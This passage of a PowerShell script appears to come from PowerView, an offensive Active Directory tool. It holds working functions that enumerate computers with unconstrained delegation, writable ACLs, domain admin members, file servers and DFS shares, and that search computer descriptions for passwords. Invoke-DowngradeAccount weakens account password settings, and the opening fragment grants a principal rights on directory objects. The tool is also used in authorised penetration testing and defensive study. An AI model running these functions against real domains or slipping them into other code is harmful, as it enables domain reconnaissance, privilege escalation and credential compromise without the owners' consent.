                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning "Error granting principal $ResolvedPrincipalSID '$Rights' on $TargetDN : $_"
                    }
                }
                $Results.dispose()
                $Searcher.dispose()
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Invoke-ACLScanner {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveGUIDs,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    
    Get-ObjectACL @PSBoundParameters | ForEach-Object {
        
        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {
        
        try {
            
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {
        
        ($_.ActiveDirectoryRights -eq "GenericAll") -or ($_.ActiveDirectoryRights -match "Write") -or ($_.ActiveDirectoryRights -match "Create") -or ($_.ActiveDirectoryRights -match "Delete") -or (($_.ActiveDirectoryRights -match "ExtendedRight") -and ($_.AccessControlType -eq "Allow"))
    }
}


filter Get-GUIDMap {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $SchemaPath = (Get-NetForest).schema.name

    $SchemaSearcher = Get-DomainSearcher -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize
    if($SchemaSearcher) {
        $SchemaSearcher.filter = "(schemaIDGUID=*)"
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            $Results.dispose()
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose "Error in building GUID map: $_"
        }
    }

    $RightsSearcher = Get-DomainSearcher -ADSpath $SchemaPath.replace("Schema","Extended-Rights") -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    if ($RightsSearcher) {
        $RightsSearcher.filter = "(objectClass=controlAccessRight)"
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            $Results.dispose()
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose "Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Get-NetComputer {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem,

        [String]
        $ServicePack,

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $SiteName,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        
        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize -Credential $Credential
    }

    process {

        if ($CompSearcher) {

            
            if($Unconstrained) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            
            if($Printers) {
                Write-Verbose "Searching for printers"
                
                $Filter += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if($OperatingSystem) {
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if($ServicePack) {
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if($SiteName) {
                $Filter += "(serverreferencebl=$SiteName)"
            }

            $CompFilter = "(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)"
            Write-Verbose "Get-NetComputer filter : '$CompFilter'"
            $CompSearcher.filter = $CompFilter

            try {
                $Results = $CompSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {
                        
                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($Up) {
                        
                        if ($FullData) {
                            
                            $Computer = Convert-LDAPProperty -Properties $_.Properties
                            $Computer.PSObject.TypeNames.Add('PowerView.Computer')
                            $Computer
                        }
                        else {
                            
                            $_.properties.dnshostname
                        }
                    }
                }
                $Results.dispose()
                $CompSearcher.dispose()
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Get-ADObject {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $ReturnRaw,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )
    process {
        if($SID) {
            
            try {
                $Name = Convert-SidToName $SID
                if($Name) {
                    $Canonical = Convert-ADName -ObjectName $Name -InputType NT4 -OutputType Canonical
                    if($Canonical) {
                        $Domain = $Canonical.split("/")[0]
                    }
                    else {
                        Write-Warning "Error resolving SID '$SID'"
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning "Error resolving SID '$SID' : $_"
                return $Null
            }
        }

        $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if($ObjectSearcher) {
            if($SID) {
                $ObjectSearcher.filter = "(&(objectsid=$SID)$Filter)"
            }
            elseif($Name) {
                $ObjectSearcher.filter = "(&(name=$Name)$Filter)"
            }
            elseif($SamAccountName) {
                $ObjectSearcher.filter = "(&(samAccountName=$SamAccountName)$Filter)"
            }

            $Results = $ObjectSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                if($ReturnRaw) {
                    $_
                }
                else {
                    
                    Convert-LDAPProperty -Properties $_.Properties
                }
            }
            $Results.dispose()
            $ObjectSearcher.dispose()
        }
    }
}


function Set-ADObject {


    [CmdletBinding()]
    Param (
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,

        $PropertyValue,

        [Int]
        $PropertyXorValue,

        [Switch]
        $ClearValue,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    $Arguments = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
        'Credential' = $Credential
    }
    
    $RawObject = Get-ADObject -ReturnRaw @Arguments
    
    try {
        
        $Entry = $RawObject.GetDirectoryEntry()
        
        if($ClearValue) {
            Write-Verbose "Clearing value"
            $Entry.$PropertyName.clear()
            $Entry.commitchanges()
        }

        elseif($PropertyXorValue) {
            $TypeName = $Entry.$PropertyName[0].GetType().name

            
            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue 
            $Entry.$PropertyName = $PropertyValue -as $TypeName       
            $Entry.commitchanges()     
        }

        else {
            $Entry.put($PropertyName, $PropertyValue)
            $Entry.setinfo()
        }
    }
    catch {
        Write-Warning "Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_"
    }
}


function Invoke-DowngradeAccount {


    [CmdletBinding()]
    Param (
        [Parameter(ParameterSetName = 'SamAccountName', Position=0, ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [Parameter(ParameterSetName = 'Name')]
        [String]
        $Name,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Switch]
        $Repair,

        [Management.Automation.PSCredential]
        $Credential
    )

    process {
        $Arguments = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
            'Credential' = $Credential
        }

        
        $UACValues = Get-ADObject @Arguments | select useraccountcontrol | ConvertFrom-UACValue

        if($Repair) {

            if($UACValues.Keys -contains "ENCRYPTED_TEXT_PWD_ALLOWED") {
                
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            
            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue -1
        }

        else {

            if($UACValues.Keys -contains "DONT_EXPIRE_PASSWORD") {
                
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536
            }

            if($UACValues.Keys -notcontains "ENCRYPTED_TEXT_PWD_ALLOWED") {
                
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            
            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue 0
        }
    }
}


function Get-ComputerProperty {


    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Properties) {
        
        $Properties = ,"name" + $Properties | Sort-Object -Unique
        Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        
        Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Find-ComputerField {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',

        [Alias('Field')]
        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    process {
        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function Get-NetOU {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($OUSearcher) {
            if ($GUID) {
                
                $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
            }
            else {
                $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"
            }

            try {
                $Results = $OUSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        
                        $OU = Convert-LDAPProperty -Properties $_.Properties
                        $OU.PSObject.TypeNames.Add('PowerView.OU')
                        $OU
                    }
                    else { 
                        
                        $_.properties.adspath
                    }
                }
                $Results.dispose()
                $OUSearcher.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-NetSite {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSprefix "CN=Sites,CN=Configuration" -PageSize $PageSize
    }
    process {
        if($SiteSearcher) {

            if ($GUID) {
                
                $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
            }
            else {
                $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName))"
            }
            
            try {
                $Results = $SiteSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        
                        $Site = Convert-LDAPProperty -Properties $_.Properties
                        $Site.PSObject.TypeNames.Add('PowerView.Site')
                        $Site
                    }
                    else {
                        
                        $_.properties.name
                    }
                }
                $Results.dispose()
                $SiteSearcher.dispose()
            }
            catch {
                Write-Verbose $_
            }
        }
    }
}


function Get-NetSubnet {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $SubnetSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -ADSprefix "CN=Subnets,CN=Sites,CN=Configuration" -PageSize $PageSize
    }

    process {
        if($SubnetSearcher) {

            $SubnetSearcher.filter="(&(objectCategory=subnet))"

            try {
                $Results = $SubnetSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        
                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match "CN=$SiteName" }
                    }
                    else {
                        
                        if ( ($SiteName -and ($_.properties.siteobject -match "CN=$SiteName,")) -or ($SiteName -eq '*')) {

                            $SubnetProperties = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $SubnetProperties['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $SubnetProperties['Site'] = 'Error'
                            }

                            New-Object -TypeName PSObject -Property $SubnetProperties
                        }
                    }
                }
                $Results.dispose()
                $SubnetSearcher.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-DomainSID {


    param(
        [String]
        $Domain,

        [String]
        $DomainController
    )

    $DCSID = Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)' | Select-Object -First 1 -ExpandProperty objectsid
    if($DCSID) {
        $DCSID.Substring(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "Error extracting domain SID for $Domain"
    }
}


function Get-NetGroup {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData,

        [Switch]
        $RawSids,

        [Switch]
        $AllTypes,

        [ValidateRange(1,10000)]
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
        if (!$AllTypes)
        {
          $Filter += "(groupType:1.2.840.113556.1.4.803:=2147483648)"
        }
    }

    process {
        if($GroupSearcher) {

            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            if ($UserName) {
                
                $User = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -Credential $Credential -ReturnRaw -PageSize $PageSize | Select-Object -First 1

                if($User) {
                    
                    $UserDirectoryEntry = $User.GetDirectoryEntry()

                    
                    $UserDirectoryEntry.RefreshCache("tokenGroups")

                    $UserDirectoryEntry.TokenGroups | ForEach-Object {
                        
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        
                        if($GroupSid -notmatch '^S-1-5-32-.*') {
                            if($FullData) {
                                $Group = Get-ADObject -SID $GroupSid -PageSize $PageSize -Domain $Domain -DomainController $DomainController -Credential $Credential
                                $Group.PSObject.TypeNames.Add('PowerView.Group')
                                $Group
                            }
                            else {
                                if($RawSids) {
                                    $GroupSid
                                }
                                else {
                                    Convert-SidToName -SID $GroupSid
                                }
                            }
                        }
                    }
                }
                else {
                    Write-Warning "UserName '$UserName' failed to resolve."
                }
            }
            else {
                if ($SID) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    $GroupSearcher.filter = "(&(objectCategory=group)(samaccountname=$GroupName)$Filter)"
                }

                $Results = $GroupSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    
                    if ($FullData) {
                        
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                        $Group.PSObject.TypeNames.Add('PowerView.Group')
                        $Group
                    }
                    else {
                        
                        $_.properties.samaccountname
                    }
                }
                $Results.dispose()
                $GroupSearcher.dispose()
            }
        }
    }
}


function Get-NetGroupMember {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [Switch]
        $Recurse,

        [Switch]
        $UseMatchingRule,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        if($DomainController) {
            $TargetDomainController = $DomainController
        }
        else {
            $TargetDomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
        }

        if($Domain) {
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = Get-NetDomain -Credential $Credential | Select-Object -ExpandProperty name
        }

        
        $GroupSearcher = Get-DomainSearcher -Domain $TargetDomain -DomainController $TargetDomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if ($GroupSearcher) {
            if ($Recurse -and $UseMatchingRule) {
                
                if ($GroupName) {
                    $Group = Get-NetGroup -AllTypes -GroupName $GroupName -Domain $TargetDomain -DomainController $TargetDomainController -Credential $Credential -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $Group = Get-NetGroup -AllTypes -SID $SID -Domain $TargetDomain -DomainController $TargetDomainController -Credential $Credential -FullData -PageSize $PageSize
                }
                else {
                    
                    $SID = (Get-DomainSID -Domain $TargetDomain -DomainController $TargetDomainController) + "-512"
                    $Group = Get-NetGroup -AllTypes -SID $SID -Domain $TargetDomain -DomainController $TargetDomainController -Credential $Credential -FullData -PageSize $PageSize
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.samaccountname

                if ($GroupDN) {
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $Members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(samaccountname=$GroupName)$Filter)"
                }
                elseif ($SID) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    
                    $SID = (Get-DomainSID -Domain $TargetDomain -DomainController $TargetDomainController) + "-512"
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }

                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    $Members = @()
                }

                $GroupFoundName = ''

                if ($Result) {
                    $Members = $Result.properties.item("member")

                    if($Members.count -eq 0) {

                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while(!$Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            
                            $GroupSearcher.PropertiesToLoad.Clear()
                            [void]$GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            [void]$GroupSearcher.PropertiesToLoad.Add("samaccountname")
                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item("samaccountname")[0]

                                if ($Members.count -eq 0) { 
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item("samaccountname")[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }
                }
                $GroupSearcher.dispose()
            }

            $Members | Where-Object {$_} | ForEach-Object {
                
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($TargetDomainController) {
                        $Result = [adsi]"LDAP://$TargetDomainController/$_"
                    }
                    else {
                        $Result = [adsi]"LDAP://$_"
                    }
                    if($Result){
                        $Properties = $Result.Properties
                    }
                }

                if($Properties) {

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Properties.samaccounttype

                    if ($FullData) {
                        $GroupMember = Convert-LDAPProperty -Properties $Properties
                    }
                    else {
                        $GroupMember = New-Object PSObject
                    }

                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $TargetDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName

                    if($Properties.objectSid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]

                        if (($MemberDN -match 'ForeignSecurityPrincipals') -and ($MemberDN -match 'S-1-5-21')) {
                            try {
                                if(-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-SidToName -SID $MemberSID | Convert-ADName -InputType 'NT4' -OutputType 'Simple'
                                if($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            
                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        
                        $MemberName = $Properties.samaccountname[0]
                    } 
                    else {
                        
                        try {
                            $MemberName = Convert-SidToName $Properties.cn[0]
                        }
                        catch {
                            
                            $MemberName = $Properties.cn
                        }
                    }

                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GroupMember | Add-Member Noteproperty 'MemberDN' $MemberDN
                    $GroupMember.PSObject.TypeNames.Add('PowerView.GroupMember')
                    $GroupMember

                    
                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {
                        if($FullData) {
                            Get-NetGroupMember -FullData -Domain $MemberDomain -DomainController $TargetDomainController -Credential $Credential -GroupName $MemberName -Recurse -PageSize $PageSize
                        }
                        else {
                            Get-NetGroupMember -Domain $MemberDomain -DomainController $TargetDomainController -Credential $Credential -GroupName $MemberName -Recurse -PageSize $PageSize
                        }
                    }
                }
            }
        }
    }
}


function Get-NetFileServer {


    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String[]]
        $TargetUsers,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    function SplitPath {
        
        param([String]$Path)

        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }
    $filter = "(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(scriptpath=*)(homedirectory=*)(profilepath=*))"
    Get-NetUser -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Filter $filter | Where-Object {$_} | Where-Object {
            
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True }
        } | ForEach-Object {
            
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function Get-DFSshare {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = "All",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    function Parse-Pkt {
        [CmdletBinding()]
        param(
            [byte[]]
            $Pkt
        )

        $bin = $Pkt
        $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
        $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
        $offset = 8
        
        $object_list = @()
        for($i=1; $i -le $blob_element_count; $i++){
               $blob_name_size_start = $offset
               $blob_name_size_end = $offset + 1
               $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

               $blob_name_start = $blob_name_size_end + 1
               $blob_name_end = $blob_name_start + $blob_name_size - 1
               $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

               $blob_data_size_start = $blob_name_end + 1
               $blob_data_size_end = $blob_data_size_start + 3
               $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

               $blob_data_start = $blob_data_size_end + 1
               $blob_data_end = $blob_data_start + $blob_data_size - 1
               $blob_data = $bin[$blob_data_start..$blob_data_end]
               switch -wildcard ($blob_name) {
                "\siteroot" {  }
                "\domainroot*" {
                    
                    
                    $root_or_link_guid_start = 0
                    $root_or_link_guid_end = 15
                    $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                    $guid = New-Object Guid(,$root_or_link_guid) 
                    $prefix_size_start = $root_or_link_guid_end + 1
                    $prefix_size_end = $prefix_size_start + 1
                    $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                    $prefix_start = $prefix_size_end + 1
                    $prefix_end = $prefix_start + $prefix_size - 1
                    $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                    $short_prefix_size_start = $prefix_end + 1
                    $short_prefix_size_end = $short_prefix_size_start + 1
                    $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                    $short_prefix_start = $short_prefix_size_end + 1
                    $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                    $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                    $type_start = $short_prefix_end + 1
                    $type_end = $type_start + 3
                    $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                    $state_start = $type_end + 1
                    $state_end = $state_start + 3
                    $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                    $comment_size_start = $state_end + 1
                    $comment_size_end = $comment_size_start + 1
                    $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                    $comment_start = $comment_size_end + 1
                    $comment_end = $comment_start + $comment_size - 1
                    if ($comment_size -gt 0)  {
                        $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                    }
                    $prefix_timestamp_start = $comment_end + 1
                    $prefix_timestamp_end = $prefix_timestamp_start + 7
                    
                    $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                    $state_timestamp_start = $prefix_timestamp_end + 1
                    $state_timestamp_end = $state_timestamp_start + 7
                    $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                    $comment_timestamp_start = $state_timestamp_end + 1
                    $comment_timestamp_end = $comment_timestamp_start + 7
                    $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                    $version_start = $comment_timestamp_end  + 1
                    $version_end = $version_start + 3
                    $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                    
                    $dfs_targetlist_blob_size_start = $version_end + 1
                    $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                    $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                    $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                    $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
